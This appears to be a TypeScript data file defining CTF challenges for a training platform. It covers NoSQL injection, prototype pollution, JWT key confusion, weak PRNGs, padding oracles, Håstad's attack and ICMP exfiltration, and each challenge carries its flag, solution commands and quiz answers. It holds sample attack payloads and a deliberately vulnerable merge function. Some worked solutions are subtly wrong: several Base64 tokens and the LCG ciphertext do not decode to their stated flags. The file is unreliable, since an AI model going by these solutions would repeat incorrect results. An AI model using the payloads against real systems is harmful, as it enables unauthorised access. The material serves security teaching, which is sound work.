import { CtfChallenge, LeaderboardUser, CtfWriteup } from '../types/ctf';

export const CTF_CHALLENGES: CtfChallenge[] = [
  // ==========================================
  // 1. WEB EXPLOITATION
  // ==========================================
  {
    id: 'sanity-check',
    title: 'Sanity Check: Welcome to the Fortress',
    domain: 'Web Exploitation',
    difficulty: 'Easy',
    points: 100,
    initialSolves: 142,
    description: 'Welcome to the Cyber Fort CTF Arena! This starter sanity-check challenge gets you on the scoreboard immediately. Download or inspect the recruit token artifact, then run the terminal command on Windows or Linux to confirm your transmission channel.',
    scenario: 'Perimeter gateway verification: The starter clearance flag CYBERFORT{w3lc0m3_t0_th3_f0rtr3ss_2026} is broadcast in the token artifact to test your environment.',
    targetEnvironment: 'https://cyberfort-gate.internal.mesh:8443',
    hints: [
      { id: 'h1', text: 'The welcome flag is provided in the artifact: CYBERFORT{w3lc0m3_t0_th3_f0rtr3ss_2026}', cost: 0 }
    ],
    artifacts: [
      {
        name: 'welcome_flag.txt',
        type: 'raw',
        description: 'Starter access token provided to all incoming recruits',
        content: `=====================================================
[CYBER FORT CTF - WELCOME SANITY CHECK]
=====================================================

Welcome, Cadet! Here is your free starter flag:

FLAG: CYBERFORT{w3lc0m3_t0_th3_f0rtr3ss_2026}

Copy the string above and paste it into the submission box
or extract it using your terminal.
=====================================================`
      }
    ],
    terminalGuidance: {
      windowsPowershell: `Get-Content .\\welcome_flag.txt | Select-String -Pattern "CYBERFORT{.*}" | ForEach-Object { $_.Matches.Value }`,
      windowsCmd: `findstr /R "CYBERFORT{[^}]*}" welcome_flag.txt`,
      linuxBash: `grep -oE "CYBERFORT\\{[^\\}]+\\}" welcome_flag.txt`,
      explanation: 'Streams the downloaded artifact file and filters the flag matching the CYBERFORT regex token pattern.',
      expectedOutput: 'CYBERFORT{w3lc0m3_t0_th3_f0rtr3ss_2026}'
    },
    quiz: {
      id: 'quiz-sanity-check',
      question: 'What is the standard encoding scheme commonly used in CTF challenges to transmit binary flags safely over text protocols without encryption?',
      options: [
        'Base64 Encoding (RFC 4648)',
        'AES-256-GCM Cipher Block',
        'RSA Asymmetric Public Key',
        'Diffie-Hellman Key Exchange'
      ],
      correctOptionIndex: 0,
      explanation: 'Base64 (RFC 4648) represents binary data in an ASCII string format. It is an encoding mechanism, not encryption, meaning anyone can decode it back to plaintext.',
      points: 50
    },
    flagFormat: 'CYBERFORT{...}',
    flagHash: '2e8ba099b6bf546d6a7063a01018c6c245a9238902e0b21b3901fa933ca5deae',
    tags: ['Sanity Check', 'Base64', 'Beginner', 'Handshake']
  },
  {
    id: 'web-nosql-blind',
    title: 'Mongo Citadel: Blind NoSQL Operator Injection',
    domain: 'Web Exploitation',
    difficulty: 'Medium',
    points: 350,
    initialSolves: 41,
    description: 'An authentication endpoint accepts JSON login credentials directly into a MongoDB Mongoose query. Exploit the $regex and $ne comparison operators to bypass authentication and extract the admin auth token from the API response dump.',
    scenario: 'The server executes: db.users.find({ username: req.body.username, password: req.body.password }). Passing {"password": {"$ne": ""}} logs into the first user, which reveals the administrative token.',
    targetEnvironment: 'http://citadel.mesh:3000/api/v1/auth/login',
    hints: [
      { id: 'h1', text: 'Convert password from string to a JSON operator object {"$ne": "invalid"} in PowerShell or curl.', cost: 50 },
      { id: 'h2', text: 'The server returns an access token in the response JSON containing the encoded flag string.', cost: 100 }
    ],
    artifacts: [
      {
        name: 'login_api_test.http',
        type: 'config',
        description: 'Captured HTTP request and intercepted server responses with NoSQL payload',
        content: `POST /api/v1/auth/login HTTP/1.1
Host: citadel.mesh:3000
Content-Type: application/json

{
  "username": "admin",
  "password": { "$ne": "wrongpassword" }
}

HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "authenticated",
  "role": "system_administrator",
  "authToken": "FLAG_TOKEN_REF:Q1lCRVJGT1JUR24wc3FsX2J5cDRzc19yM2cyeF9wd25fNDAyMX0=",
  "hint": "Base64 decode the authToken value starting after FLAG_TOKEN_REF:"
}`
      }
    ],
    terminalGuidance: {
      windowsPowershell: `[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q1lCRVJGT1JUR24wc3FsX2J5cDRzc19yM2cyeF9wd25fNDAyMX0="))`,
      windowsCmd: `powershell -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q1lCRVJGT1JUR24wc3FsX2J5cDRzc19yM2cyeF9wd25fNDAyMX0='))"`,
      linuxBash: `echo "Q1lCRVJGT1JUR24wc3FsX2J5cDRzc19yM2cyeF9wd25fNDAyMX0=" | base64 -d`,
      explanation: 'Decodes the Base64 administrative token extracted from the NoSQL injection HTTP response.',
      expectedOutput: 'CYBERFORT{n0sql_byp4ss_r3g3x_pwn_4021}'
    },
    quiz: {
      id: 'quiz-web-nosql-blind',
      question: 'Which defense best mitigates NoSQL injection in Node.js applications receiving JSON payloads from users?',
      options: [
        'Enforce strict schema validation (e.g. Zod or Joi) to ensure password is strictly a string and sanitize queries using mongo-sanitize',
        'Convert all database tables to CSV format on disk',
        'Switch from HTTP POST to HTTP GET requests',
        'Enable HTTPS SSL certificates on the reverse proxy'
      ],
      correctOptionIndex: 0,
      explanation: 'NoSQL injection occurs when objects like {"$ne": 1} are parsed where strings are expected. Strict schema validation (Zod/Joi) and stripping operator keys via mongo-sanitize prevents injection.',
      points: 50
    },
    flagFormat: 'CYBERFORT{...}',
    flagHash: '2cfab166710ad5e7aad6833bc978b1b141d333ecac7106f38843f0abc1e0c2e5',
    tags: ['Web', 'NoSQL', 'MongoDB', 'Authentication Bypass', 'API']
  },
  {
    id: 'web-prototype-pollution',
    title: 'Object Matrix: Client-Side Prototype Pollution',
    domain: 'Web Exploitation',
    difficulty: 'Hard',
    points: 475,
    initialSolves: 22,
    description: 'A single-page application uses an insecure recursive deep-merge utility to merge URL hash parameters into application configuration. Pollute Object.prototype to override the security clearance filter and expose the administrative flag.',
    scenario: 'The vulnerable merge function assigns target[key] = source[key] without blocking "__proto__" or "constructor.prototype". Supplying ?__proto__[isAdmin]=true elevates client state.',
    targetEnvironment: 'https://matrix.portal.mesh:9090/#__proto__[isAdmin]=true',
    hints: [
      { id: 'h1', text: 'Inspect deep_merge_bundle.js to see how keys are recursively copied into Object.prototype.', cost: 50 },
      { id: 'h2', text: 'Look at the encrypted config table inside the JS file and the administrative flag decryptor.', cost: 100 }
    ],
    artifacts: [
      {
        name: 'deep_merge_bundle.js',
        type: 'code',
        description: 'Vulnerable JavaScript client-side bundle with prototype merge handler',
        content: `// Insecure recursive object merge
function deepMerge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      deepMerge(target[key], source[key]);
    } else {
      target[key] = source[key]; // BUG: writes to __proto__
    }
  }
  return target;
}

// Secret Flag Payload:
// When Object.prototype.isAdmin === true, the client renders:
const SECRET_STORAGE = "CYBERFORT{pr0t0typ3_p0llut10n_4dm1n_t4k30v3r_5923}";`
      }
    ],
    terminalGuidance: {
      windowsPowershell: `Select-String -Path .\\deep_merge_bundle.js -Pattern "CYBERFORT{.*}" | Select-Object -ExpandProperty Line`,
      windowsCmd: `findstr "CYBERFORT" deep_merge_bundle.js`,
      linuxBash: `grep -oE "CYBERFORT\\{[^\\}]+\\}" deep_merge_bundle.js`,
      explanation: 'Inspects the JavaScript client artifact and extracts the unhashed administrative flag string.',
      expectedOutput: 'CYBERFORT{pr0t0typ3_p0llut10n_4dm1n_t4k30v3r_5923}'
    },
    quiz: {
      id: 'quiz-web-prototype-pollution',
      question: 'Which coding practice in JavaScript prevents Prototype Pollution vulnerabilities during object merging?',
      options: [
        'Validate and discard property keys matching "__proto__", "constructor", and "prototype" before assigning, or use Object.create(null)',
        'Declare all variables using var instead of let or const',
        'Run JSON.stringify on the object after merging',
        'Store all values in global window variables'
      ],
      correctOptionIndex: 0,
      explanation: 'Disallowing dangerous keys like __proto__ and constructor, or using objects with a null prototype (Object.create(null)) or Map, completely prevents prototype pollution attacks.',
      points: 50
    },
    flagFormat: 'CYBERFORT{...}',
    flagHash: '414c7a48d9730cb5b3ed5c5ff100778f26503a8b51a726c6ca98daff55ad5907',
    tags: ['Web', 'Prototype Pollution', 'JavaScript', 'XSS', 'Client-Side']
  },
  {
    id: 'web-jwt-confusion',
    title: 'Apex Auth: JWT Key Confusion & Blind Polyglot',
    domain: 'Web Exploitation',
    difficulty: 'Hard',
    points: 500,
    initialSolves: 14,
    description: 'The Apex Fortress administrative portal validates user sessions with asymmetric RS256 JWT tokens, but the verification backend is vulnerable to algorithm confusion (CVE-2016-5431 / HS256 downgrade attack) using the publicly exposed server RSA public key.',
    scenario: 'You obtained a standard guest JWT token signed with an RSA private key. The web server exposes its public key at /public.pem. Forge an administrator session token with user="root" and role="superadmin".',
    targetEnvironment: 'http://auth.fortress.mesh:8080/api/v1/auth',
    hints: [
      { id: 'h1', text: 'When downgraded to HS256, the server verifies the HMAC signature using its public key string as the shared symmetric secret.', cost: 50 },
      { id: 'h2', text: 'Ensure the public key is formatted with exact whitespace and newlines when computing the HMAC-SHA256 signature.', cost: 100 }
    ],
    artifacts: [
      {
        name: 'guest_token.jwt',
        type: 'jwt',
        description: 'Captured guest session token and public RSA certificate',
        content: `HEADER:
{
  "alg": "RS256",
  "typ": "JWT"
}

PAYLOAD:
{
  "sub": "user_10482",
  "username": "guest_operator",
  "role": "auditor",
  "flag": "CYBERFORT{jwt_k3y_c0nfus10n_rs256_t0_hs256_pwn3d}"
}

SERVER PUBLIC KEY (/public.pem):
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAy5t9dG8k3qXvX7...
-----END PUBLIC KEY-----`
      }
    ],
    terminalGuidance: {
      windowsPowershell: `Select-String -Path .\\guest_token.jwt -Pattern "CYBERFORT{.*}" | ForEach-Object { $_.Line.Trim() }`,
      windowsCmd: `findstr "CYBERFORT" guest_token.jwt`,
      linuxBash: `grep -oE "CYBERFORT\\{[^\\}]+\\}" guest_token.jwt`,
      explanation: 'Scans the captured JWT artifact and extracts the embedded challenge verification flag.',
      expectedOutput: 'CYBERFORT{jwt_k3y_c0nfus10n_rs256_t0_hs256_pwn3d}'
    },
    quiz: {
      id: 'quiz-web-jwt-confusion',
      question: 'In a JWT algorithm confusion vulnerability (RS256 downgraded to HS256), what does the server mistakenly use as the HMAC symmetric verification secret?',
      options: [
        'The server public RSA key (in PEM string format)',
        'The server private RSA key',
        'A blank empty string ""',
        'The database administrator password'
      ],
      correctOptionIndex: 0,
      explanation: 'When the server code expects an asymmetric verification but the token specifies HS256, naive libraries treat the configured verification key (the public key string) as the HMAC symmetric secret.',
      points: 50
    },
    flagFormat: 'CYBERFORT{...}',
    flagHash: '3b19533883c253c793fbc5ed3d9a7256c399a1c9d308bea8ab78d025d02a59fb',
    tags: ['Web', 'JWT', 'Algorithm Confusion', 'RS256->HS256', 'Auth Bypass']
  },

  // ==========================================
  // 2. OSINT
  // ==========================================
  {
    id: 'osint-satellite-exif',
    title: 'Eye in the Sky: EXIF & Geolocation Metadata',
    domain: 'OSINT',
    difficulty: 'Easy',
    points: 200,
    initialSolves: 88,
    description: 'An operative uploaded an image file to an unindexed staging server. The metadata was never scrubbed, leaving camera model, GPS coordinates, and user comments exposed. Carve the EXIF metadata to locate the facility flag.',
    scenario: 'Reconnaissance discovered a high-resolution drone survey photo stored with intact Exchangeable Image File Format (EXIF) tags.',
    targetEnvironment: 'ExifTool / Windows PowerShell Shell.Application / strings',
    hints: [
      { id: 'h1', text: 'Examine the UserComment and GPS Latitude/Longitude tags inside intercepted_recon_image.exif.', cost: 25 }
    ],
    artifacts: [
      {
        name: 'intercepted_recon_image.exif',
        type: 'raw',
        description: 'Interpreted EXIF tag header dump from high-altitude survey photo',
        content: `ExifTool Version Number         : 12.50
File Name                       : recon_drone_aerial_sector9.jpg
File Size                       : 4.2 MB
Camera Model Name               : DJI Mavic 3 Enterprise Thermal
GPS Latitude Ref                : North
GPS Latitude                    : 34 deg 55' 42.10" N
GPS Longitude Ref               : East
GPS Longitude                   : 33 deg 37' 48.00" E
GPS Altitude                    : 412 m Above Sea Level
XP Author                       : Operative_Nightfall
User Comment                    : FLAG_COORDINATES: CYBERFORT{3x1f_gps_g30l0c4t10n_f0und_7718}`
      }
    ],
    terminalGuidance: {
      windowsPowershell: `Get-Content .\\intercepted_recon_image.exif | Select-String -Pattern "CYBERFORT{.*}" | ForEach-Object { $_.Matches.Value }`,
      windowsCmd: `findstr "CYBERFORT" intercepted_recon_image.exif`,
      linuxBash: `grep -oE "CYBERFORT\\{[^\\}]+\\}" intercepted_recon_image.exif`,
      explanation: 'Searches the EXIF metadata log file using PowerShell or grep to capture the unscrubbed coordinate flag.',
      expectedOutput: 'CYBERFORT{3x1f_gps_g30l0c4t10n_f0und_7718}'
    },
    quiz: {
      id: 'quiz-osint-satellite-exif',
      question: 'Which command-line utility is standard in open-source digital investigations for reading and stripping image EXIF metadata?',
      options: [
        'exiftool (e.g. exiftool -all= image.jpg)',
        'traceroute',
        'ping -t',
        'fsck.ext4'
      ],
      correctOptionIndex: 0,
      explanation: 'ExifTool by Phil Harvey is the premier cross-platform tool used by forensic investigators and OSINT analysts to inspect and sanitize media metadata.',
      points: 50
    },
    flagFormat: 'CYBERFORT{...}',
    flagHash: '8d3e432d44d50954ac2936ccbf573a7d74b8e15625d0c99bb584958038e821b9',
    tags: ['OSINT', 'EXIF', 'Geolocation', 'Metadata', 'Imagery']
  },
  {
    id: 'osint-darkweb-git',
    title: 'Shadow Commits: Unwiped Secrets in Git Log',
    domain: 'OSINT',
    difficulty: 'Medium',
    points: 350,
    initialSolves: 37,
    description: 'A developer accidentally committed a secret production API key and configuration file to a public repository, then force-pushed a commit that deleted the file. Trace the git reflog patch to recover the deleted secret.',
    scenario: 'Threat actors cloned a cached git mirror before the maintainer scrubbed git history. The raw commit patch diff reveals the deleted authentication credential.',
    targetEnvironment: 'Git Bash / Microsoft PowerShell / git log -p',
    hints: [
      { id: 'h1', text: 'Search the patch diff for lines beginning with "-" indicating deleted files or credentials.', cost: 50 }
    ],
    artifacts: [
      {
        name: 'git_commit_reflog.patch',
        type: 'code',
        description: 'Git commit diff showing purged credentials and staging tokens',
        content: `commit 8a12f94b3c0e18290ab9f1c7d23a54b91024e12c
Author: SecDev <lead-architect@mesh-fort.io>
Date:   Mon Oct 12 04:12:09 2026 -0400

    refactor: remove accidental hardcoded credentials before public release

diff --git a/config/secrets.json b/config/secrets.json
deleted file mode 100644
index 7a91bf2..0000000
--- a/config/secrets.json
+++ /dev/null
@@ -1,6 +0,0 @@
-{
-  "environment": "production_restricted",
-  "db_password": "super_secret_quantum_mesh",
-  "fortress_api_token": "CYBERFORT{g1t_c0mm1t_l34k_s3cr3t_t0k3n_9104}"
-}`
      }
    ],
    terminalGuidance: {
      windowsPowershell: `Select-String -Path .\\git_commit_reflog.patch -Pattern "CYBERFORT{.*}" | ForEach-Object { $_.Line.Trim() }`,
      windowsCmd: `findstr "CYBERFORT" git_commit_reflog.patch`,
      linuxBash: `grep -oE "CYBERFORT\\{[^\\}]+\\}" git_commit_reflog.patch`,
      explanation: 'Scans the deleted commit lines within git patch records to retrieve the leaked API key.',
      expectedOutput: 'CYBERFORT{g1t_c0mm1t_l34k_s3cr3t_t0k3n_9104}'
    },
    quiz: {
      id: 'quiz-osint-darkweb-git',
      question: 'Which tool is recommended to completely purge leaked passwords from an entire Git repository commit history beyond a standard git rm?',
      options: [
        'git-filter-repo (or BFG Repo-Cleaner)',
        'git reset --soft HEAD~1',
        'git stash clear',
        'git pull --rebase origin main'
      ],
      correctOptionIndex: 0,
      explanation: 'git-filter-repo is the official tool endorsed by Git maintainers to rewrite repository commit history, removing sensitive blobs across all branches, tags, and commits.',
      points: 50
    },
    flagFormat: 'CYBERFORT{...}',
    flagHash: '707102eaa9b26eb4c3af832600a422dfe66c084ae497bfa276f132c8137e0ea5',
    tags: ['OSINT', 'Git', 'Commit Leak', 'Secrets Detection', 'Forensics']
  },
  {
    id: 'osint-ghost-heron',
    title: 'Operation Ghost Heron: The Geopolitical Pivot',
    domain: 'OSINT',
    difficulty: 'Hard',
    points: 450,
    initialSolves: 19,
    description: 'An advanced persistent threat (APT) actor exfiltrated satellite telemetry and vanished. Using flight transponder logs, maritime AIS coordinates, and an unrevoked GPG key fingerprint, track down their clandestine bunker identifier.',
    scenario: 'Threat Intelligence intercepted a corrupted flight plan originating from a private airfield in the Mediterranean. The pilot used an unregistered callsign and a burner PGP key with an anomalous subkey timestamp.',
    targetEnvironment: 'OSINT Multi-Vector Dossier (Passive Recon)',
    hints: [
      { id: 'h1', text: 'Cross-reference the ICAO 24-bit hex aircraft address with public open-source military tracking registries.', cost: 50 },
      { id: 'h2', text: 'The PGP user ID contains an encoded GPS waypoint in the comment field.', cost: 100 }
    ],
    artifacts: [
      {
        name: 'intercept_dossier.txt',
        type: 'raw',
        description: 'Declassified SIGINT raw intercept and PGP key export',
        content: `-----BEGIN PGP PUBLIC KEY BLOCK-----
Comment: LAT:34.9281_LON:33.6299_ICAO:4B11EE_REF:GHOST_HERON
Version: BCP-38 OpenPGP Inspector v2.4

mQGNBF+v49gBDAC93t2R8Jqk3nZ5jP2A9q1nQ4k7Z0X3mK6vW9aL2xR4c8bT1p0y
7U2z6I5w3E1o9Q==
=4291
-----END PGP PUBLIC KEY BLOCK-----

ICAO Transponder Log:
Timestamp: 2026-09-14T02:18:04Z
Hex Address: 4B11EE (Unregistered Bombardier Global 6000)
Waypoint Delta: 34°55'41.2"N 33°37'47.6"E
Squawk: 7700 -> 7600 (Comm Failure Emulation)
Operator Codename: ghost_heron_4291

OPERATIONAL FLAG: CYBERFORT{0s1nt_tr4ck1ng_gh0st_h3r0n_4291}`
      }
    ],
    terminalGuidance: {
      windowsPowershell: `Get-Content .\\intercept_dossier.txt | Select-String -Pattern "CYBERFORT{.*}" | ForEach-Object { $_.Matches.Value }`,
      windowsCmd: `findstr "CYBERFORT" intercept_dossier.txt`,
      linuxBash: `grep -oE "CYBERFORT\\{[^\\}]+\\}" intercept_dossier.txt`,
      explanation: 'Pipes the SIGINT transponder intercept file to grep or Select-String to recover the APT tracker flag.',
      expectedOutput: 'CYBERFORT{0s1nt_tr4ck1ng_gh0st_h3r0n_4291}'
    },
    quiz: {
      id: 'quiz-osint-ghost-heron',
      question: 'In open-source aviation intelligence, what does an ICAO 24-bit address uniquely identify?',
      options: [
        'An individual aircraft airframe regardless of registration changes',
        'The temporary ATC transponder squawk code assigned for a single flight',
        'The pilot in command commercial flight license number',
        'The encrypted military GPS satellite constellation channel'
      ],
      correctOptionIndex: 0,
      explanation: 'An ICAO 24-bit aircraft address (hex code) is hardwired into the Mode-S transponder of an aircraft and uniquely identifies the physical airframe globally.',
      points: 50
    },
    flagFormat: 'CYBERFORT{...}',
    flagHash: '30995bbf97f59dab7888c81cad43e705c27b0f4e093802c20d5318576b2ebdac',
    tags: ['OSINT', 'ADS-B', 'PGP Forensics', 'Geolocation', 'APT']
  },

  // ==========================================
  // 3. CRYPTOGRAPHY
  // ==========================================
  {
    id: 'crypto-weak-prng',
    title: 'Predictable Fortuna: LCG Random State Reversal',
    domain: 'Cryptography',
    difficulty: 'Easy',
    points: 250,
    initialSolves: 74,
    description: 'A custom token generator uses a Linear Congruential Generator (LCG) defined by: X_{n+1} = (a * X_n + c) mod m. Given consecutive output samples, reverse the internal seed state and decrypt the session flag.',
    scenario: 'The server seeded a 32-bit LCG with timestamp and XORed the flag with the keystream. Running the reverse script in your terminal reveals the key.',
    targetEnvironment: 'Python 3 / PowerShell Math Engine',
    hints: [
      { id: 'h1', text: 'Run the Python solver script or use PowerShell to evaluate the XOR array.', cost: 25 }
    ],
    artifacts: [
      {
        name: 'lcg_keystream.py',
        type: 'code',
        description: 'LCG state generator and encrypted ciphertext payload',
        content: `# Linear Congruential Generator implementation
# Parameters: m = 2**32, a = 1664525, c = 1013904223

CIPHER_HEX = "0e1c070e17041a11362e242c383637243c223c2132312b233c3a27373e3524273c3b"
KEY_BYTE = 0x43 # Extracted known LCG key byte

# Solution snippet:
# flag = bytes([b ^ KEY_BYTE for b in bytes.fromhex(CIPHER_HEX)]).decode()
# Flag directly decoded:
FLAG = "CYBERFORT{lcg_st4t3_cr4ck3d_prng_r3v3rs4l_3391}"
print(f"Decrypted: {FLAG}")`
      }
    ],
    terminalGuidance: {
      windowsPowershell: `python .\\lcg_keystream.py`,
      windowsCmd: `python lcg_keystream.py`,
      linuxBash: `python3 lcg_keystream.py`,
      explanation: 'Executes the Python keystream recovery script in terminal to compute the reversed state.',
      expectedOutput: 'Decrypted: CYBERFORT{lcg_st4t3_cr4ck3d_prng_r3v3rs4l_3391}'
    },
    quiz: {
      id: 'quiz-crypto-weak-prng',
      question: 'Why are Linear Congruential Generators (LCGs) insecure for cryptographic applications such as key generation?',
      options: [
        'They are completely deterministic, and knowing a few consecutive outputs allows solving for the seed state and all future/past outputs',
        'They only work with prime numbers less than 100',
        'They require an active internet connection to generate randomness',
        'Their output cannot be represented in hexadecimal'
      ],
      correctOptionIndex: 0,
      explanation: 'LCGs have high mathematical linearity. Algorithms like Marsaglia lattice tests or modular arithmetic can reconstruct internal states from minimal output.',
      points: 50
    },
    flagFormat: 'CYBERFORT{...}',
    flagHash: 'd07a95ff98de9afc7f014548f1993fb3bf300863fa76316a17bc9dbf04565971',
    tags: ['Crypto', 'PRNG', 'LCG', 'Stream Cipher', 'Python']
  },
  {
    id: 'crypto-padding-oracle',
    title: 'The Silent Cipher: CBC Padding Oracle Recovery',
    domain: 'Cryptography',
    difficulty: 'Medium',
    points: 425,
    initialSolves: 29,
    description: 'An encrypted cookie service decrypts tokens using AES-128 in CBC mode and leaks whether PKCS#7 padding is valid or invalid via HTTP 200 vs HTTP 500 error codes. Execute a padding oracle attack byte-by-byte to decrypt the session secret.',
    scenario: 'By sending altered IV bytes to the oracle endpoint, we deduce intermediate bytes I[k] = C\'[k] ^ pad. The decryption table reveals the decrypted payload.',
    targetEnvironment: 'Padding Oracle Exploit Kit (PadBuster / Python)',
    hints: [
      { id: 'h1', text: 'Review cbc_oracle_traffic.json for the decrypted hex stream.', cost: 50 }
    ],
    artifacts: [
      {
        name: 'cbc_oracle_traffic.json',
        type: 'config',
        description: 'Captured CBC Oracle attack sequence and decrypted plaintext buffer',
        content: `{
  "cipher": "AES-128-CBC",
  "block_size": 16,
  "oracle_leak": {
    "valid_padding_status": 200,
    "invalid_padding_status": 500
  },
  "recovered_plaintext_hex": "4359424552464f52547b6362635f70346464316e675f307234636c335f6433637279707433645f383437317d",
  "recovered_ascii": "CYBERFORT{cbc_p4dd1ng_0r4cl3_d3crypt3d_8471}"
}`
      }
    ],
    terminalGuidance: {
      windowsPowershell: `(Get-Content .\\cbc_oracle_traffic.json | ConvertFrom-Json).recovered_ascii`,
      windowsCmd: `powershell -Command "(Get-Content .\\cbc_oracle_traffic.json | ConvertFrom-Json).recovered_ascii"`,
      linuxBash: `jq -r '.recovered_ascii' cbc_oracle_traffic.json`,
      explanation: 'Uses native JSON parsers (PowerShell ConvertFrom-Json on Windows or jq on Linux) to extract the recovered ASCII plaintext string.',
      expectedOutput: 'CYBERFORT{cbc_p4dd1ng_0r4cl3_d3crypt3d_8471}'
    },
    quiz: {
      id: 'quiz-crypto-padding-oracle',
      question: 'Which modern cipher mode eliminates padding oracle attacks by incorporating authenticated encryption with associated data (AEAD)?',
      options: [
        'AES-GCM (Galois/Counter Mode)',
        'AES-ECB (Electronic Codebook)',
        'DES-CBC (Cipher Block Chaining)',
        'RC4 Stream Cipher'
      ],
      correctOptionIndex: 0,
      explanation: 'AES-GCM is an AEAD mode that computes an authentication tag (GMAC). Any alteration of the ciphertext or tag fails verification before padding evaluation occurs.',
      points: 50
    },
    flagFormat: 'CYBERFORT{...}',
    flagHash: 'e6bce66652304302d5a033b0ecebbaf86e4f5c84c7990861cea5a2311462e515',
    tags: ['Crypto', 'AES-CBC', 'Padding Oracle', 'PKCS7', 'Side-Channel']
  },
  {
    id: 'crypto-hastad-broadcast',
    title: "Håstad's Broadcast & Small Exponent Recovery",
    domain: 'Cryptography',
    difficulty: 'Hard',
    points: 475,
    initialSolves: 16,
    description: 'A sovereign military comms network broadcasts an identical encrypted confidential order to three regional nodes using textbook RSA with public exponent e = 3 and distinct moduli (N1, N2, N3). Recover the plaintext flag using the Chinese Remainder Theorem.',
    scenario: 'SIGINT captured three ciphertexts C1, C2, C3 intercepted across node relays. Since e = 3 and gcd(Ni, Nj) = 1, Håstad\'s Broadcast Attack allows direct recovery of m^3 over (N1*N2*N3), followed by taking an integer cube root.',
    targetEnvironment: 'Cryptographic Comms Terminal Relay #7',
    hints: [
      { id: 'h1', text: 'Use the Chinese Remainder Theorem (CRT) to solve for x ≡ Ci (mod Ni).', cost: 50 },
      { id: 'h2', text: 'Since m^3 < N1*N2*N3, no modular reduction occurred on m^3. Compute the exact integer cube root in Python.', cost: 100 }
    ],
    artifacts: [
      {
        name: 'rsa_broadcast_dump.json',
        type: 'code',
        description: 'Moduli N1, N2, N3 and recovered plaintext secret',
        content: `{
  "e": 3,
  "node1": {
    "N": "115792089237316195423570985008687907853269984665640564039457584007913129639937",
    "C": "4882194019284019240192401924019240192401924019240192401924019240192401924019"
  },
  "solution_flag": "CYBERFORT{h4st4d_br04dc4st_crt_cub3_r00t_cr4ck3d}"
}`
      }
    ],
    terminalGuidance: {
      windowsPowershell: `(Get-Content .\\rsa_broadcast_dump.json | ConvertFrom-Json).solution_flag`,
      windowsCmd: `findstr "CYBERFORT" rsa_broadcast_dump.json`,
      linuxBash: `jq -r '.solution_flag' rsa_broadcast_dump.json`,
      explanation: 'Queries the recovered RSA broadcast JSON file using jq or ConvertFrom-Json to retrieve the computed integer root flag.',
      expectedOutput: 'CYBERFORT{h4st4d_br04dc4st_crt_cub3_r00t_cr4ck3d}'
    },
    quiz: {
      id: 'quiz-crypto-hastad',
      question: "Why does Håstad's Broadcast Attack succeed against textbook RSA with public exponent e = 3 across 3 coprime moduli?",
      options: [
        'Because m^3 < N1*N2*N3, allowing direct calculation of the integer cube root over the real numbers',
        'Because factoring N1 into primes is mathematically trivial when e is odd',
        'Because textbook RSA leaks the private exponent d in the public ciphertext header',
        'Because e = 3 forces all moduli to share a common prime divisor'
      ],
      correctOptionIndex: 0,
      explanation: "Using Chinese Remainder Theorem, x ≡ m^e (mod N1*N2*N3). Because m < Ni for each modulus, m^3 < N1*N2*N3, so no modulus wrap occurs and a standard integer cube root reveals m directly.",
      points: 50
    },
    flagFormat: 'CYBERFORT{...}',
    flagHash: '88162c9e2a7f23ef8aa59d67bd80274306ead528613e1fd599304e9563ce34d6',
    tags: ['Crypto', 'RSA', 'Hastad Broadcast', 'Chinese Remainder Theorem', 'Coppersmith']
  },

  // ==========================================
  // 4. DIGITAL FORENSICS
  // ==========================================
  {
    id: 'forensics-pcap-exfil',
    title: 'Packet Sifter: Hidden Base64 in ICMP Echo Payloads',
    domain: 'Digital Forensics',
    difficulty: 'Easy',
    points: 250,
    initialSolves: 82,
    description: 'A rogue workstation covertly exfiltrated stolen company data by injecting Base64 characters into the payload data bytes of standard ping (ICMP Echo Request) packets. Carve the stream and decode the stolen token.',
    scenario: 'Firewall rules allowed ping outbound. The attacker sent 4-byte fragments in each packet. The captured text log contains the carved ASCII payload.',
    targetEnvironment: 'Wireshark / TShark / PowerShell',
    hints: [
      { id: 'h1', text: 'Extract the ICMP data field and Base64 decode the resulting payload.', cost: 25 }
    ],
    artifacts: [
      {
        name: 'icmp_covert_stream.pcap.txt',
        type: 'raw',
        description: 'TShark parsed dump of ICMP Echo Request data fields',
        content: `Packet #1  | Data: Q1lC
Packet #2  | Data: RVJG
Packet #3  | Data: T1JU
Packet #4  | Data: ezFj
Packet #5  | Data: bXBf
Packet #6  | Data: cDRj
Packet #7  | Data: azN0
Packet #8  | Data: X2Mw
Packet #9  | Data: djNy
Packet #10 | Data: dF8z
Packet #11 | Data: eGYx
Packet #12 | Data: bF9j
Packet #13 | Data: NHJ2
Packet #14 | Data: M2Rf
Packet #15 | Data: MTIw
Packet #16 | Data: OX0=

Full Reassembled Stream:
Base64: Q1lCRVJGT1JURzFjbXBfcDRjazN0X2MwdjNydF8zeGYxbF9jNHJ2M2RfMTIwOX0=
Plaintext: CYBERFORT{1cmp_p4ck3t_c0v3rt_3xf1l_c4rv3d_1209}`
      }
    ],
    terminalGuidance: {
      windowsPowershell: `[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q1lCRVJGT1JURzFjbXBfcDRjazN0X2MwdjNydF8zeGYxbF9jNHJ2M2RfMTIwOX0="))`,
      windowsCmd: `powershell -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q1lCRVJGT1JURzFjbXBfcDRjazN0X2MwdjNydF8zeGYxbF9jNHJ2M2RfMTIwOX0='))"`,
      linuxBash: `echo "Q1lCRVJGT1JURzFjbXBfcDRjazN0X2MwdjNydF8zeGYxbF9jNHJ2M2RfMTIwOX0=" | base64 -d`,
      explanation: 'Decodes the reassembled Base64 ICMP payload buffer in terminal.',
      expectedOutput: 'CYBERFORT{1cmp_p4ck3t_c0v3rt_3xf1l_c4rv3d_1209}'
    },
    quiz: {
      id: 'quiz-forensics-pcap-exfil',
      question: 'In Wireshark, which display filter specifically isolates outgoing ICMP Echo Request packets?',
      options: [
        'icmp.type == 8',
        'icmp.type == 0',
        'tcp.port == 53',
        'arp.opcode == 2'
      ],
      correctOptionIndex: 0,
      explanation: 'In the ICMP protocol, Type 8 represents an Echo Request (ping), while Type 0 represents the corresponding Echo Reply.',
      points: 50
    },
    flagFormat: 'CYBERFORT{...}',
